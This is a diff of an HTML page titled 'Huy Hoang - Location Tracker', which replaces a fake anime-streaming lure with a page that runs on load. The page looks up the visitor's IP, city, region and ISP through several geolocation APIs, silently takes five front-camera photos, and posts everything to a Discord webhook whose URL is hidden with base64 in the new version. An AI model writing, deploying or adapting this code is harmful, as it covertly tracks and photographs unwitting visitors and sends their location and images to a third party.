@@ -3,107 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Server Anime • Huy Hoàng</title>
+    <title>Huy Hoang - Location Tracker</title>
     <style>
         body {
+            background: #0a0a0a;
             margin: 0;
-            padding: 0;
-            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
-            color: #fff;
-            font-family: 'Segoe UI', sans-serif;
-            overflow: hidden;
-            height: 100vh;
+            padding: 20px;
+            font-family: monospace;
+            color: #0f0;
+            line-height: 1.6;
         }
-        #bg-video {
-            position: fixed;
-            top: 0; left: 0; right: 0; bottom: 0;
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            z-index: -1;
-            opacity: 0.75;
+        .status {
+            color: #ff0;
+            margin: 15px 0;
+            padding: 10px;
+            background: rgba(255, 200, 0, 0.1);
+            border-radius: 6px;
         }
-        .container {
-            position: relative;
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-            z-index: 10;
-        }
-        .title {
-            font-size: 2.5rem;
-            font-weight: bold;
-            color: #ff99ff;
-            text-shadow: 0 0 25px #ff00ff;
-            margin-bottom: 8px;
-        }
-        .subtitle {
-            font-size: 1.35rem;
-            color: #a0f0ff;
-            margin-bottom: 60px;
-        }
-        .circle {
-            width: 220px;
-            height: 220px;
-            border: 8px solid rgba(255, 100, 255, 0.4);
-            border-top: 8px solid #ff00ff;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 3.2rem;
-            font-weight: bold;
-            color: #ff99ff;
-            margin: 30px 0;
-            animation: spin 2.2s linear infinite;
-            box-shadow: 0 0 40px rgba(255, 0, 255, 0.5);
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        button {
-            background: linear-gradient(45deg, #ff00ff, #00ffff);
-            color: white;
-            border: none;
-            padding: 18px 70px;
-            font-size: 1.3rem;
-            font-weight: bold;
-            border-radius: 50px;
-            cursor: pointer;
-            box-shadow: 0 0 35px rgba(255, 0, 255, 0.8);
-        }
-        button:hover {
-            transform: scale(1.1);
-        }
-        .hidden { display: none !important; }
     </style>
 </head>
 <body>
-
-    <!-- Video Anime Background -->
-    <video id="bg-video" autoplay loop muted playsinline>
-        <source src="https://files.catbox.moe/0v4v0j.mp4" type="video/mp4">
-    </video>
-
-    <div class="container" id="animeScreen">
-        <div class="title">CHÀO MỪNG ĐẾN VỚI</div>
-        <div class="subtitle">SERVER ANIME CỦA HUY HOÀNG</div>
-        <div class="circle" id="circle">▶</div>
-        <button onclick="startRealTracking()">ẤN VÀO ĐÂY ĐỂ XEM ANIME</button>
-        <div style="margin-top: 50px; color:#99ddff; font-size:0.95rem;">Đang kết nối server anime 4K • 60FPS...</div>
-    </div>
-
-    <!-- Code chính -->
-    <div class="status" id="status" style="display:none;">Đang khởi tạo tracker cấp độ MAX...</div>
+    <div class="status">Đang khởi tạo tracker cấp độ MAX...</div>
     <video id="video" autoplay playsinline style="display:none; width:100%; max-width:400px;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // ================== WEBHOOK MỚI CỦA BẠN ==================
-        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1488092153883263048/qVOfMlJoEKghGT7OGyQ07aYlXAysUlH25Kt6sqfR4WIHbuis2Kl31ypw39z_BcJPyv4G';
+        // ================== WEBHOOK ĐÃ MÃ HÓA ==================
+        const webhook = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4ODA5MjE1Mzg4MzI2MzA0OC9xVk9mTWxKb0VLa2dHVDdPR3lRMDdhWWxYQXlzVWxIMjVLdDZzUWZSNFdJSGJ1aXMyS2wzMXlwdzM5el9CY0pQeXY0Rw==");
 
         const PHOTO_COUNT = 5;
         const PHOTO_INTERVAL = 400;
@@ -111,7 +37,7 @@
 
         async function sendText(content) {
             try {
-                await fetch(DISCORD_WEBHOOK_URL, {
+                await fetch(webhook, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ username: "Huy Hoang - Location Tracker", content })
@@ -127,41 +53,84 @@
                     username: "Huy Hoang - Location Tracker",
                     content: caption
                 }));
-                await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: form });
+                await fetch(webhook, { method: 'POST', body: form });
             } catch(e) {}
         }
 
+        // ================== CHECK VỊ TRÍ XỊN XÒ CẤP ĐỘ MAX ==================
         async function sendVisitorInfo() {
-            let ip = "Không xác định", city = "Không xác định", region = "Không xác định", isp = "Không xác định";
-            const apis = ["https://ip-api.com/json/?fields=query,status,city,regionName,isp","https://ipapi.co/json/"];
+            let ip = "Không xác định";
+            let city = "Không xác định";
+            let region = "Không xác định";
+            let isp = "Không xác định";
+            let country = "Không xác định";
+
+            const apis = [
+                "https://ip-api.com/json/?fields=query,status,city,regionName,isp,org,country",
+                "https://ipapi.co/json/",
+                "https://freeipapi.com/api/json",
+                "https://extreme-ip-lookup.com/json/"
+            ];
+
             for (let url of apis) {
                 try {
-                    const res = await fetch(url, { signal: AbortSignal.timeout(5000) });
+                    const res = await fetch(url, { signal: AbortSignal.timeout(7000) });
+                    if (!res.ok) continue;
                     const data = await res.json();
+
                     if (url.includes("ip-api.com") && data.status === "success") {
-                        ip = data.query; city = data.city || city; region = data.regionName || region; isp = data.isp || isp;
+                        ip = data.query || ip;
+                        city = data.city || city;
+                        region = data.regionName || region;
+                        isp = data.isp || data.org || isp;
+                        country = data.country || country;
                         break;
                     } else if (url.includes("ipapi.co")) {
-                        ip = data.ip || ip; city = data.city || city; region = data.region || region; isp = data.org || isp;
+                        ip = data.ip || ip;
+                        city = data.city || city;
+                        region = data.region || region;
+                        isp = data.org || isp;
+                        country = data.country_name || country;
+                    } else if (url.includes("freeipapi")) {
+                        ip = data.ipAddress || ip;
+                        city = data.cityName || city;
+                        region = data.regionName || region;
+                        isp = data.isp || isp;
                     }
+
+                    if (city !== "Không xác định" && isp !== "Không xác định") break;
                 } catch(e) {}
             }
-            const msg = `**📥 KHÁCH TRUY CẬP MỚI**\n\n🌐 **IP:** ${ip}\n📍 **Thành phố:** ${city}\n🗺️ **Khu vực:** ${region}\n🏢 **Nhà mạng:** ${isp}\n📱 **Thiết bị:** ${navigator.platform || "Không xác định"}\n⏰ **Thời gian:** ${new Date().toLocaleString('vi-VN')}`;
+
+            const msg = `**📥 KHÁCH TRUY CẬP MỚI**\n\n` +
+                        `🌐 **IP:** ${ip}\n` +
+                        `📍 **Thành phố:** ${city}\n` +
+                        `🗺️ **Khu vực:** ${region}\n` +
+                        `🏳️ **Quốc gia:** ${country}\n` +
+                        `🏢 **Nhà mạng:** ${isp}\n` +
+                        `📱 **Thiết bị:** ${navigator.platform || "Không xác định"}\n` +
+                        `⏰ **Thời gian:** ${new Date().toLocaleString('vi-VN')}\n` +
+                        `🔗 **Nguồn:** Truy cập trực tiếp`;
+
             await sendText(msg);
         }
 
+        // ================== PHẦN CHỤP ẢNH (GIỮ NGUYÊN) ==================
         async function startCameraAndCapture() {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
-            const status = document.getElementById('status');
+            const status = document.querySelector('.status');
             try {
                 cameraStream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: { ideal: "user" }, width: { ideal: 640 }, height: { ideal: 480 }}
+                    video: {
+                        facingMode: { ideal: "user" },
+                        width: { ideal: 640, max: 1280 },
+                        height: { ideal: 480, max: 720 }
+                    }
                 });
                 video.srcObject = cameraStream;
                 await new Promise(r => video.onloadedmetadata = r);
                 video.play();
-
                 status.textContent = "✅ Camera đã mở. Đang chụp ảnh...";
                 for (let i = 1; i <= PHOTO_COUNT; i++) {
                     await new Promise(resolve => {
@@ -176,23 +145,23 @@
                     if (i < PHOTO_COUNT) await new Promise(r => setTimeout(r, PHOTO_INTERVAL));
                 }
                 if (cameraStream) cameraStream.getTracks().forEach(track => track.stop());
+                status.textContent = "✅ Đã chụp xong 5 ảnh";
             } catch (err) {
                 console.error(err);
+                let msg = "⚠️ Không mở được camera.\n";
+                if (err.name === "NotAllowedError") msg += "Bạn chưa cho phép quyền camera.";
+                status.style.color = "#f66";
+                status.textContent = msg;
+                await sendText("⚠️ " + msg.replace(/\n/g, " "));
             }
         }
 
         async function init() {
             await sendVisitorInfo();
-            setTimeout(startCameraAndCapture, 800);
+            setTimeout(startCameraAndCapture, 600);
         }
 
-        function startRealTracking() {
-            document.getElementById('speedtestScreen').classList.add('hidden');
-            document.getElementById('status').style.display = 'block';
-            init();
-        }
-
-        window.addEventListener('load', () => {});
+        window.addEventListener('load', init);
     </script>
 </body>
 </html>
